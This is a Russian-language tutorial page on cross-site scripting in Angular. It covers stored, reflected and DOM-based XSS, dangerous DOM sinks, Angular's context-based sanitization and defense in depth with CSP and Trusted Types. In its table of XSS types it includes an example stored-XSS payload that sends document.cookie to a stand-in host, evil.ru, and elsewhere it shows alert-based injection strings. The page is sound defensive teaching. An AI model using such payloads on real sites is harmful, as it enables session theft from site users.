XSS (Cross-Site Scripting) — внедрение вредоносного скрипта в страницу, который выполняется в браузере жертвы от имени вашего сайта. Скрипт получает всё, что есть у страницы: доступ к DOM, `localStorage`, возможность делать запросы с cookies пользователя. Это самая распространённая уязвимость фронтенда.

## Виды XSS

| Вид | Откуда приходит скрипт | Пример |
| --- | --- | --- |
| **Stored** (хранимая) | сохранён в базе и показывается другим | комментарий `<img src=x onerror="fetch('//evil.ru?c='+document.cookie)">` |
| **Reflected** (отражённая) | из параметров запроса, сразу отражается в ответе | `/search?q=<script>...</script>` в ссылке из письма |
| **DOM-based** | клиентский код сам вставляет данные в опасное место | `element.innerHTML = location.hash.slice(1)` |

Во фронтенд-фреймворках чаще всего встречается DOM-based XSS: данные из URL, API или `postMessage` попадают в «опасную точку» (sink).

## Опасные точки (sinks)

```js
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
element.insertAdjacentHTML('beforeend', userInput);
eval(userInput);
new Function(userInput);
setTimeout(userInput); // строковая форма
link.href = userInput; // javascript:alert(1)
iframe.src = userInput;
element.setAttribute('onclick', userInput);
```

## Защита Angular по умолчанию

Angular **считает все значения недоверенными** и обрабатывает их в зависимости от контекста.

### Интерполяция и привязка свойств экранируются

```ts
comment = '<img src=x onerror="alert(1)">';
```

```html
<p>{{ comment }}</p>
<!-- выводится как текст: &lt;img src=x ...&gt; — скрипт не выполнится -->
```

Интерполяция устанавливает `textContent`, а не HTML.

### Контексты безопасности и санитизация

Когда значение попадает в опасный контекст, Angular его **санитизирует** — очищает от опасного:

| Контекст | Пример | Что делает Angular |
| --- | --- | --- |
| HTML | `[innerHTML]="html"` | удаляет `<script>`, обработчики `on*`, опасные атрибуты; оставляет безопасную разметку |
| Style | `[style]="css"` | санитизирует стили |
| URL | `[href]="url"`, `[src]` для img | блокирует `javascript:` и подобные схемы (заменяет на `unsafe:...`) |
| Resource URL | `<iframe [src]>`, `<script [src]>` | **запрещено** без явного доверия — загрузка кода |

```ts
html = '<b>жирный</b><script>alert(1)</script><img src=x onerror="alert(2)">';
```

```html
<div [innerHTML]="html"></div>
<!-- результат: <b>жирный</b><img src="x"> и предупреждение в консоли:
     "WARNING: sanitizing HTML stripped some content" -->
```

> [!NOTE]
> На этой платформе тексты уроков (Markdown → HTML) выводятся через `[innerHTML]`, поэтому проходят санитизацию Angular — даже если файл с уроком будет подменён, скрипт не выполнится. Санитайзер удаляет и атрибуты `id`, поэтому якоря у заголовков добавляются после рендера через `Renderer2`, а не берутся из HTML-строки.

### AOT и шаблоны

Шаблоны Angular компилируются при сборке. Никогда не собирайте шаблон из пользовательских данных и не используйте JIT-компиляцию с динамическим шаблоном: шаблон — это код, и внедрённый в него `{{ constructor.constructor('alert(1)')() }}` выполнится.

## Как XSS появляется в Angular-приложении

1. **Прямая работа с DOM** в обход Angular:

```ts
// Плохо: санитизации нет
this.el.nativeElement.innerHTML = this.message;
// Хорошо
this.renderer.setProperty(this.el.nativeElement, 'textContent', this.message);
```

2. **bypassSecurityTrust\*** с непроверенными данными — см. [DomSanitizer](/tracks/security/dom-sanitizer).
3. **Сторонние библиотеки**, которые сами вставляют HTML (редакторы, Markdown-рендереры, графики с HTML-подписями).
4. **Серверный рендеринг** с ручной сборкой HTML-строк.
5. **`href` из данных пользователя** через `setAttribute` (минуя биндинг Angular).

## Defense in depth

Санитизация — первая линия. Дополнительно:

- **Content Security Policy** запрещает inline-скрипты и скрипты с чужих доменов — даже внедрённый тег не выполнится ([CSP и Trusted Types](/tracks/security/csp-trusted-types)).
- **Trusted Types** запрещают передавать строки в опасные sink-и на уровне браузера.
- **HttpOnly-cookies** — XSS не сможет прочитать сессию.
- **Санитизация на сервере** для хранимого HTML (например, DOMPurify в Node.js или библиотека на бэкенде) — ваше приложение не единственный клиент данных.
- **Валидация ввода** по белому списку там, где формат известен (email, id, числа).

> [!INTERVIEW]
> «Как Angular защищает от XSS?» — Все значения считаются недоверенными. Интерполяция выводит текст, а не HTML. При привязке к опасным контекстам (`innerHTML`, `style`, `href`/`src`) Angular санитизирует значение в зависимости от контекста: удаляет скрипты и обработчики, блокирует `javascript:`-URL. Resource URL (`iframe src`, `script src`) без явного доверия запрещены. Шаблоны компилируются AOT, поэтому данные не становятся кодом. Обойти защиту можно только явно: прямой работой с DOM или `bypassSecurityTrust*`. Дополнительно — CSP и Trusted Types.

## Коротко

- XSS — выполнение чужого скрипта в контексте вашего сайта: stored, reflected, DOM-based.
- Angular экранирует интерполяцию и санитизирует HTML, стили и URL по контексту.
- Уязвимости появляются при обходе Angular: `nativeElement.innerHTML`, `bypassSecurityTrust*`, сторонние библиотеки.
- Шаблоны — код: не собирайте их из данных.
- Добавьте CSP, Trusted Types, HttpOnly-cookies и серверную санитизацию.
